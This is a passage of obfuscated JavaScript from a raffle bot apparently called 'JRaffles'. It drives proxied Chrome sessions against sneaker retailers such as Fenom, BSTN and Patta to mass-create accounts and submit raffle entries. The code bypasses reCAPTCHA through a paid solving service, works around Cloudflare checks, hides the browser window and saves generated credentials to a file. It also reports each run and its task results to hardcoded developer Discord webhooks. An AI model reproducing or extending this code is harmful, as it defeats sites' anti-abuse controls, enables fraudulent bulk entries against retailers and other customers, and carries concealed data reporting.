                'succesDEVMSG': { 'embeds': [_0x6859a8] },
                'succesPUBMSG': { 'embeds': [_0x1102ce] }
            };
            try {
                _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x21fc7b['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x21fc7b['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0xb27635, _0x21fc7b['succesPUBMSG']);
            } catch (_0x349218) {
                console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x349218));
            }
        } catch (_0x55df2e) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20' + _0x55df2e)), _0x3cab5a = 'yes', _0x508ba3 = '' + _0x55df2e;
            var _0x2e770a = await _0x51c110(_0x918d87[_0x4ad3de], _0x309ac0, 'dev', !![], _0x508ba3), _0x6859a8 = await _0x51c110(_0x918d87[_0x4ad3de], _0x309ac0, 'dev', ![]), _0x1102ce = await _0x51c110(_0x918d87[_0x4ad3de], _0x309ac0, 'pub', ![]);
            const _0xba357d = {
                'succesDEVMSG': { 'embeds': [_0x6859a8] },
                'succesPUBMSG': { 'embeds': [_0x1102ce] }
            };
            _0xba357d['errorDEV'] = { 'embeds': [_0x2e770a] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0xba357d['errorDEV']), await _0x5778ae(_0xc30fae, _0xba357d['errorDEV']);
        } finally {
            _0x4f7a1f['close']();
            if (_0x3cab5a == 'yes' && _0x1077a3 != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Retrying')), _0x4ad3de = _0x4ad3de - 0x1, _0x1077a3 = _0x1077a3 + 0x1;
                continue;
            }
            _0x3cab5a == 'yes' && _0x1077a3 >= 0x5 && (_0x3c82b6(_0x918d87[_0x4ad3de], _0x309ac0), _0x3cab5a = 'no', _0x1077a3 = 0x0), console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x250ebf(_0x3ad8a4, _0x23eb26, _0xb69644) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x56e605 = 0x0; _0x56e605 < _0x3ad8a4['length']; _0x56e605++) {
        if (_0x1858eb != 'yes')
            var _0x1858eb = '', _0x26ba87 = 0x0;
        var _0x4f0d0a;
        await _0x44956d(_0x3ad8a4, _0x56e605), _0x359416(_0xb69644['name'] + '\x20Task\x20' + (_0x56e605 + 0x1) + '\x20/\x20' + _0x3ad8a4['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        var _0x5d05ae = await _0x51c110(_0x3ad8a4[_0x56e605], _0xb69644, 'acc', ![]);
        const _0x4d8872 = { 'succesDEVMSG': { 'embeds': [_0x5d05ae] } }, _0x1fd857 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x1bdc5d = Math['round'](Math['random']() * (_0x23eb26['length'] - 0x1)), _0x355189 = _0x23eb26[_0x1bdc5d]['split'](':'), _0xf39f;
        try {
            _0xf39f = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x355189[0x0] + ':' + _0x355189[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0xf39f = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x355189[0x0] + ':' + _0x355189[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x277c7e = await _0xf39f['newPage']();
            await _0x277c7e['setViewport']({
                'width': 0x500 + _0x4c130e(0x1, 0x32),
                'height': 0x2d9 + _0x4c130e(0x1, 0x32)
            });
            const _0x4742a5 = await _0x277c7e['target']()['createCDPSession'](), { windowId: _0x414460 } = await _0x4742a5['send']('Browser.getWindowForTarget');
            await _0x277c7e['authenticate']({
                'username': '' + _0x355189[0x2],
                'password': '' + _0x355189[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x277c7e['goto']('' + _0x1fd857, { 'waitUntil': 'networkidle2' }), await _0x30926a(0x1388), console['log'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x2af01b = await _0x277c7e['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x2af01b && await _0x2af01b['click']();
            } catch {
            }
            await _0x4742a5['send']('Browser.setWindowBounds', {
                'windowId': _0x414460,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x277c7e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x30926a(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x277c7e['type']('input[name=\x22firstname\x22]', '' + _0x3ad8a4[_0x56e605]['FirstName']), await _0x30926a(0x1f4), await _0x277c7e['type']('input[name=\x22lastname\x22]', '' + _0x3ad8a4[_0x56e605]['LastName']), await _0x30926a(0x1f4), await _0x277c7e['type']('input[name=\x22email\x22]', '' + _0x3ad8a4[_0x56e605]['Email']), await _0x30926a(0x1f4), await _0x277c7e['type']('input[name=\x22password\x22]', '' + _0x3ad8a4[_0x56e605]['Password']), await _0x30926a(0x258), await _0x277c7e['$eval']('input[name=\x22psgdpr\x22]', _0x5cf9e9 => _0x5cf9e9['click']()), await _0x30926a(0x1f4), console['log'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x277c7e['$eval']('#customer-form', _0x486bae => _0x486bae['submit']());
            try {
                await _0x277c7e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x1858eb = 'no', console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Account\x20' + _0x3ad8a4[_0x56e605]['Email'] + '\x20Generated')), _0x1c44db['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x3ad8a4[_0x56e605]['Email'] + ',' + _0x3ad8a4[_0x56e605]['Password']);
                try {
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x4d8872['succesDEVMSG']);
                } catch {
                }
                await _0x5778ae(_0x5cef85, _0x4d8872['succesDEVMSG']);
            } catch (_0x21a03c) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x21a03c);
            }
        } catch (_0x184cdd) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20' + _0x184cdd)), _0x4f0d0a = '' + _0x184cdd;
            var _0x5ac5df = await _0x51c110(_0x3ad8a4[_0x56e605], _0xb69644, 'acc', !![], _0x4f0d0a);
            _0x4d8872['errorDEV'] = { 'embeds': [_0x5ac5df] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x4d8872['errorDEV']), await _0x5778ae(_0xc30fae, _0x4d8872['errorDEV']), _0x1858eb = 'yes';
        } finally {
            _0xf39f['close']();
            if (_0x1858eb == 'yes' && _0x26ba87 != 0x5 && _0x4f0d0a != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Task\x20' + (_0x56e605 + 0x1) + '\x20:\x20Retrying')), _0x56e605 = _0x56e605 - 0x1, _0x26ba87 = _0x26ba87 + 0x1;
                continue;
            }
            _0x1858eb == 'yes' && _0x26ba87 >= 0x5 && (_0x3c82b6(_0x3ad8a4[_0x56e605], _0xb69644), _0x1858eb = 'no', _0x26ba87 = 0x0), console['log'](_0x31f3f5() + '\x20[' + _0xb69644['name'] + ']\x20Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x7b4a0e(_0x108595, _0x9b4966, _0x10e3d5) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2743e2 = 0x0; _0x2743e2 < _0x108595['length']; _0x2743e2++) {
        if (_0x5c1dd1 != 'yes')
            var _0x5c1dd1 = '', _0x210a9d = 0x0;
        var _0x350305;
        await _0x44956d(_0x108595, _0x2743e2), _0x359416(_0x10e3d5['name'] + '\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20/\x20' + _0x108595['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        const _0x21bfbb = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x57e38d = Math['round'](Math['random']() * (_0x9b4966['length'] - 0x1)), _0x596200 = _0x9b4966[_0x57e38d]['split'](':'), _0x252ba7;
        try {
            _0x252ba7 = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x596200[0x0] + ':' + _0x596200[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x252ba7 = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x596200[0x0] + ':' + _0x596200[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x16864b = await _0x252ba7['newPage'](), _0x386104 = await _0x16864b['target']()['createCDPSession'](), { windowId: _0x3774c8 } = await _0x386104['send']('Browser.getWindowForTarget');
            await _0x16864b['authenticate']({
                'username': '' + _0x596200[0x2],
                'password': '' + _0x596200[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16864b['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x30926a(0xbb8), await _0x386104['send']('Browser.setWindowBounds', {
                'windowId': _0x3774c8,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x30926a(0x1f40);
            try {
                await _0x16864b['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x30926a(0x1388), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Logging\x20in'), await _0x16864b['type']('input[name=\x22email\x22]', '' + _0x108595[_0x2743e2]['Email']), await _0x30926a(0x1f4), await _0x16864b['type']('input[name=\x22password\x22]', '' + _0x108595[_0x2743e2]['Password']), await _0x30926a(0x258), await _0x16864b['$eval']('#login-form', _0x50e0ee => _0x50e0ee['submit']()), await _0x16864b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x30926a(0x1f4), await _0x16864b['goto']('' + _0x108595[_0x2743e2]['Url']), await _0x16864b['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x108595[_0x2743e2]['Size']);
            if (_0x108595[_0x2743e2]['Size'] != 'RANDOM') {
                var _0x28f577 = '\x20' + _0x108595[_0x2743e2]['Size'] + '\x20';
                const _0xfe10cb = await _0x16864b['$x']('//span[contains(text(),\x20' + _0x28f577 + ')]');
                await _0xfe10cb[0x0]['click']();
            } else {
                const _0x3cba0f = await _0x16864b['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x456893 = Math['round'](Math['random']() * (_0x3cba0f['length'] - 0x1));
                await _0x3cba0f[_0x456893]['click']();
            }
            await _0x30926a(0x258), await _0x16864b['click']('#cookieChoiceDismiss'), await _0x30926a(0x3e8), await _0x16864b['type']('#instagram-account', '' + _0x108595[_0x2743e2]['Follower']), await _0x30926a(0x28a), await _0x16864b['click']('#book-btn'), await _0x30926a(0xbb8), await _0x16864b['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x30926a(0x1f4), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20' + _0x471d3f['cyan']('Solving\x20Captcha')), await _0x16864b['solveRecaptchas'](), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x30926a(0x7d0), await _0x16864b['$eval']('#book-btn-for-sure', _0x53868d => _0x53868d['click']()), await _0x30926a(0x12c), await _0x16864b['click']('#book-btn-for-sure'), await _0x30926a(0xdac);
            const _0x506cc4 = await _0x16864b['$eval']('.reservation-popup\x20>\x20.title', _0x4fe736 => {
                return _0x4fe736['innerHTML'];
            });
            if (_0x506cc4) {
                _0x5c1dd1 = 'no', _0x2989d8(_0x108595[_0x2743e2], _0x10e3d5), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x2f263f = await _0x51c110(_0x108595[_0x2743e2], _0x10e3d5, 'dev', ![]), _0x589852 = await _0x51c110(_0x108595[_0x2743e2], _0x10e3d5, 'pub', ![]);
                const _0x45898f = {
                    'succesDEVMSG': { 'embeds': [_0x2f263f] },
                    'succesPUBMSG': { 'embeds': [_0x589852] }
                };
                try {
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x45898f['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x45898f['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0xb27635, _0x45898f['succesPUBMSG']);
                } catch (_0xb1a403) {
                    console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xb1a403));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x1ea520) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20' + _0x1ea520)), _0x350305 = '' + _0x1ea520;
            var _0x4dea56 = await _0x51c110(_0x108595[_0x2743e2], _0x10e3d5, 'dev', !![], _0x350305), _0x2f263f = await _0x51c110(_0x108595[_0x2743e2], _0x10e3d5, 'dev', ![]), _0x589852 = await _0x51c110(_0x108595[_0x2743e2], _0x10e3d5, 'pub', ![]);
            const _0x399ce4 = {
                'succesDEVMSG': { 'embeds': [_0x2f263f] },
                'succesPUBMSG': { 'embeds': [_0x589852] }
            };
            _0x399ce4['errorDEV'] = { 'embeds': [_0x4dea56] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x399ce4['errorDEV']), await _0x5778ae(_0xc30fae, _0x399ce4['errorDEV']), _0x1ea520 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5c1dd1 = 'yes');
        } finally {
            _0x252ba7['close']();
            if (_0x5c1dd1 == 'yes' && _0x210a9d != 0x5 && _0x350305 != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Task\x20' + (_0x2743e2 + 0x1) + '\x20:\x20Retrying')), _0x2743e2 = _0x2743e2 - 0x1, _0x210a9d = _0x210a9d + 0x1;
                continue;
            }
            _0x5c1dd1 == 'yes' && _0x210a9d >= 0x5 && (_0x3c82b6(_0x108595[_0x2743e2], _0x10e3d5), _0x5c1dd1 = 'no', _0x210a9d = 0x0), console['log'](_0x31f3f5() + '\x20[' + _0x10e3d5['name'] + ']\x20Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x428c96() {
    await _0x3a17b7(), console['clear']();
    if (_0x531a7c != 'devkey') {
        let _0x3c6fc4 = await _0x672a1d['autoUpdate']();
        if (_0x3c6fc4 === 'yes')
            return _0x14088d('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4c1f70 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x30926a(0x2710);
        ;
    }
    await _0x267540(_0x4c1f70);
    if (_0x5d17e9 === ![])
        return console['log']('Closing\x20Browser'), await _0x30926a(0xbb8);
    else
        try {
            var _0x1afbd9 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3566aa
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x531a7c
                    }
                ]
            }];
            const _0xb9ec36 = { 'embeds': _0x1afbd9 };
            var _0x25df93 = await _0x51c110(null, null, 'open', ![]);
            const _0x33941f = { 'openDEVMSG': { 'embeds': [_0x25df93] } };
            await _0x5778ae(_0x21e347, _0x33941f['openDEVMSG']);
            async function _0x109452() {
                _0x359416('JRaffles\x20' + _0x531a7c), console['clear'](), console['log']('Welcome\x20to\x20' + _0x471d3f['cyan']('JRaffles();') + '\x20' + _0x531a7c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x344333 = 0x0; _0x344333 < _0x1299c5['length'] - 0x3; _0x344333++) {
                    if (_0x1299c5[_0x344333]['name'] === 'Reload\x20Settings' || _0x1299c5[_0x344333]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x344333 + ')\x20[' + _0x1299c5[_0x344333]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1299c5['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1299c5['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1299c5['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x508a21();
                if (taskModule > _0x1299c5['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x30926a(0x3e8), _0x109452();
                if (_0x1299c5[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                    var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x5ae717 = await _0x10659e(), _0x33e8e6 = await _0x746fa1();
                        await _0x54d971(_0x33e8e6, _0x5ae717, _0xee5303);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x5ae717 = await _0x10659e(), _0x33e8e6 = await _0x746fa1();
                            await _0x1336bb(_0x33e8e6, _0x5ae717, _0xee5303);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5ae717 = await _0x10659e(), _0x1cf295 = await _0x2f83b0(), _0x219ad2 = _0x1cf295['split'](';');
                                await _0x100403(_0x219ad2, _0x5ae717, _0xee5303);
                            }
                        }
                    }
                    return _0x109452();
                }
                if (_0x1299c5[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                        var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5ae717 = await _0x10659e(), _0x1b7c07 = await _0x746fa1();
                            await _0x7b4a0e(_0x1b7c07, _0x5ae717, _0xee5303);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5ae717 = await _0x10659e(), _0x1b7c07 = await _0x746fa1();
                                await _0x250ebf(_0x1b7c07, _0x5ae717, _0xee5303);
                            }
                        }
                    } catch (_0x26d9df) {
                        console['log'](_0x26d9df), await _0x30926a(0xfa0);
                    }
                    return _0x109452();
                }
                if (_0x1299c5[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                    var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5ae717 = await _0x10659e(), _0x6ea4e9 = await _0x746fa1();
                    if (_0x6ea4e9[0x0]['Url'] == '' || _0x6ea4e9[0x0]['Url'] == undefined) {
                        await _0x289e17(_0x5ae717);
                        var _0x13c408 = await _0x3f3940();
                        return await afewFunction('' + _0x31c585[_0x13c408], 'nor', _0xee5303, _0x6ea4e9, _0x5ae717), _0x109452();
                    }
                    return await afewFunction(_0x6ea4e9[0x0]['Url'], 'nor', _0xee5303, _0x6ea4e9, _0x5ae717), _0x109452();
                } else {
                    if (_0x1299c5[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                        var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x5ae717 = await _0x10659e(), _0xd2c14b = await _0x746fa1();
                            console['log']('Starting\x20' + _0xd2c14b['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x3fd38c = 0x0; _0x3fd38c < _0xd2c14b['length']; _0x3fd38c++) {
                                console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x958417(_0x3fd38c, 'nor', _0xee5303, _0xd2c14b, _0x5ae717), console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Sleeping\x20for\x20' + _0x1ca3b9['MahaDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['MahaDelay']);
                                } catch (_0x14f32e) {
                                    console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Error\x20' + _0x14f32e));
                                }
                            }
                            ;
                            return _0x109452();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5ae717 = await _0x10659e();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x1cf295 = await _0x2f83b0(), _0x219ad2 = _0x1cf295['split'](';'), console['log'](_0x219ad2['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x3fd38c = 0x0; _0x3fd38c < _0x219ad2['length']; _0x3fd38c++) {
                                    _0xee5303['url'] = _0x219ad2[_0x3fd38c], console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x958417(_0x3fd38c, 'ver', _0xee5303, _0xd2c14b, _0x5ae717), console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Sleeping\x20for\x20' + _0x1ca3b9['verificationDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['verificationDelay']);
                                    } catch (_0x30b8da) {
                                        console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Error\x20' + _0x30b8da));
                                    }
                                }
                                ;
                                return _0x109452();
                            }
                        }
                    } else {
                        if (_0x1299c5[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                            var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction], _0x5ae717 = await _0x10659e(), _0x5484ca = await _0x746fa1();
                            return await _0x9f0708(_0x5484ca, _0x5ae717, _0xee5303), await _0x30926a(0x1388), _0x109452();
                        } else {
                            if (_0x1299c5[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x5ae717 = await _0x10659e(), _0x1a1b47 = await _0x746fa1();
                                    console['log']('Starting\x20' + _0x471d3f['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x3fd38c = 0x0; _0x3fd38c < _0x1a1b47['length']; _0x3fd38c++) {
                                        console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x2091e0(_0x3fd38c, 'nor', _0xee5303, _0x1a1b47, _0x5ae717);
                                        } catch (_0x479e21) {
                                            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Task\x20failed\x20' + _0x479e21));
                                        }
                                        console['log'](_0x31f3f5() + '\x20[' + _0xee5303['name'] + ']\x20Sleeping\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
                                    }
                                    return _0x109452();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x5ae717 = await _0x10659e();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x1cf295 = await _0x2f83b0(), _0x219ad2 = _0x1cf295['split'](';'), console['log'](_0x219ad2['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x3fd38c = 0x0; _0x3fd38c < _0x219ad2['length']; _0x3fd38c++) {
                                            try {
                                                _0xee5303['url'] = _0x219ad2[_0x3fd38c], console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x3fd38c + 0x1) + ':\x20Getting\x20Session'), await _0x2091e0(_0x3fd38c, 'ver', _0xee5303, null, _0x5ae717), console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x1ca3b9['verificationDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['verificationDelay']);
                                            } catch (_0x351b13) {
                                                console['log'](_0x351b13), await _0x30926a(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x109452();
                                    }
                                }
                                ;
                            } else {
                                if (_0x1299c5[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                    var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x4e3767('https://bouncewear.com/nl/account/register', _0xee5303);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1299c5[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                        var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x5ae717 = await _0x10659e(), _0x1633a4 = await _0x746fa1();
                                            return await _0x1f648c('https://patta.nl/account/register', _0xee5303, _0x1633a4, _0x5ae717), _0x109452();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x5ae717 = await _0x10659e(), _0x1633a4 = await _0x746fa1();
                                                return await _0x5a9e33('', _0xee5303, _0x1633a4, _0x5ae717), _0x109452();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1299c5[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                            var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
